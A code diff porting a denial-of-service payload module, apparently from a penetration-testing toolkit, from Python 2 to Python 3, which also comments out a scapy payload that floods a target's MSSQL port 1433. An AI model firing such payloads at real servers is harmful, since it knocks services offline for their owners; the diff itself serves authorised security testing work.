@@ -1,11 +1,11 @@
 #!/usr/bin/env python
 
-import ConfigParser
+import configparser
 
 class DenialOfService():
     def __init__(self, target, cnf):
         # Read configuration
-        self.config = ConfigParser.RawConfigParser()
+        self.config = configparser.RawConfigParser()
         self.config.read(cnf)
 
         self._target = target
@@ -14,12 +14,12 @@ class DenialOfService():
     def getPayloads(self):
 
         ### DoS against MSSQL
-        self.payloads.append([
-            "DoS against MSSQL",
-            "scapy",
-            """sr1(IP(dst="%target%")/TCP(dport=1433)/"0"*1000, verbose=0)""",
-            ""
-        ])
+        # self.payloads.append([
+        #     "DoS against MSSQL",
+        #     "scapy",
+        #     """sr1(IP(dst="%target%")/TCP(dport=1433)/"0"*1000, verbose=0)""",
+        #     ""
+        # ])
 
         ### AB DoS - Added by Robert Pallas
         self.payloads.append([
@@ -39,4 +39,4 @@ class DenialOfService():
         return self.payloads
 
 if __name__ == "__main__":
-    print DenialOfService("192.168.100.48").getPayloads()
+    print(DenialOfService("192.168.100.48").getPayloads())
